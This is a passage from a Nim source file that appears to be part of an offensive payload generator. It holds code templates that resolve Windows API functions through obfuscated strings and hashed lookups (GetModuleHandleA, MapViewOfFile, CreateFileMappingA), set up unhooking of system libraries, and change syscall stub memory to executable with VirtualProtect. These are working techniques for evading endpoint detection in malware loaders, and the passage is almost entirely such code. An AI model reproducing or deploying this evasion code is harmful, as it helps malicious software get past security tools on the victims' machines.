      VirtualProtect(syscallStub_NtProtect, cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READ, addr oldProtection)
    

"""

let DInvokeUnhookStubs * = """

    const
      PSAPI_DLL = obf("psapi.dll")

    type
      MODULEINFO {.pure.} = object
        lpBaseOfDll: LPVOID
        SizeOfImage: DWORD
        EntryPoint: LPVOID
      LPMODULEINFO = ptr MODULEINFO

    type
      GetModuleHandleA_t = proc(lpModuleName: LPCSTR): HMODULE {.stdcall.}
      GetModuleInformation_t = proc(hProcess: HANDLE, hModule: HMODULE, lpmodinfo: LPMODULEINFO, cb: DWORD): WINBOOL {.stdcall.}
      CreateFileMappingA_t = proc(hFile: HANDLE, lpFileMappingAttributes: LPSECURITY_ATTRIBUTES, flProtect: DWORD, dwMaximumSizeHigh: DWORD, dwMaximumSizeLow: DWORD, lpName: LPCWSTR): HANDLE {.stdcall.}
      MapViewOfFile_t = proc(hFileMappingObject: HANDLE, dwDesiredAccess: DWORD, dwFileOffsetHigh: DWORD, dwFileOffsetLow: DWORD, dwNumberOfBytesToMap: SIZE_T): LPVOID {.stdcall.}
      FreeLibrary_t = proc(hLibModule: HMODULE): WINBOOL {.stdcall.}

    const
      GetModuleHandleA_HASH  = obf("GetModuleHandleA")
      GetModuleInformation_HASH  = obf("GetModuleInformation")
      CreateFileMappingA_HASH  = obf("CreateFileMappingA")
      MapViewOfFile_HASH  = obf("MapViewOfFile")
      FreeLibrary_HASH  = obf("FreeLibrary")

    var MyGetModuleHandleA: GetModuleHandleA_t
    var MyGetModuleInformation: GetModuleInformation_t
    var MyCreateFileMappingA: CreateFileMappingA_t
    var MyMapViewOfFile: MapViewOfFile_t
    var MyFreeLibrary: FreeLibrary_t

    MyGetModuleHandleA = cast[GetModuleHandleA_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetModuleHandleA_HASH, 0, FALSE)))

    MyGetModuleInformation = cast[GetModuleInformation_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(PSAPI_DLL, TRUE)), GetModuleInformation_HASH, 0, FALSE)))

    MyCreateFileMappingA = cast[CreateFileMappingA_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), CreateFileMappingA_HASH, 0, FALSE))

    MyMapViewOfFile = cast[MapViewOfFile_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), MapViewOfFile_HASH, 0, FALSE))

    MyFreeLibrary = cast[FreeLibrary_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), FreeLibrary_HASH, 0, FALSE))
"""

let SyscallStubSizeStub * = """
var 
    SYSCALL_STUB_SIZE: int = 23
"""
